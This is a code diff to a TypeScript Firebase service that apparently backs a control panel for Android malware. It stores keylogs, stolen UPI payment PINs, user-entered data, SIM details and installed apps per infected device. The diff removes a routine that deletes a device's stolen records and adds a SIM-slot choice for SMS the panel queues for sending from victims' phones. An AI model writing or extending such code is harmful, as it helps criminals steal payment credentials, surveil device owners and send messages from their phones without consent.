@@ -489,26 +489,7 @@ export class FirebaseService {
     }
   }
 
-  // Delete all data for a specific device
-  async deleteDevice(deviceId: string): Promise<void> {
-    try {
-      // Delete from all relevant nodes
-      const updates: Record<string, null> = {
-        [`DeviceInfo/${deviceId}`]: null,
-        [`Sims/${deviceId}`]: null,
-        [`Keylogs/${deviceId}`]: null,
-        [`UPIPins/${deviceId}`]: null,
-        [`UserEntered/${deviceId}`]: null,
-        [`AppsInstalled/${deviceId}`]: null,
-        // Note: Not deleting from SmsData as it might be shared across devices
-      };
-      
-      await update(ref(database), updates);
-    } catch (error) {
-      console.error("Error deleting device:", error);
-      throw error;
-    }
-  }
+  
 
   // Get all UPI pins for all devices (for Device Management table)
   async getAllUPIPins(): Promise<Record<string, Array<{ pin: string; timestamp: string }>>> {
@@ -641,6 +622,7 @@ export class FirebaseService {
     recipientNumber: string,
     message: string,
     deviceId?: string,
+    simSlot?: string,
   ): Promise<string> {
     try {
       // Create device identifier using the actual deviceId or model
@@ -650,6 +632,7 @@ export class FirebaseService {
       const smsData = {
         Message: message,
         Sender: recipientNumber,
+        SimSlot: simSlot || "1", // Default to "1" if not provided
         Status: "pending",
         TimeStamp: new Date().toISOString(),
       };
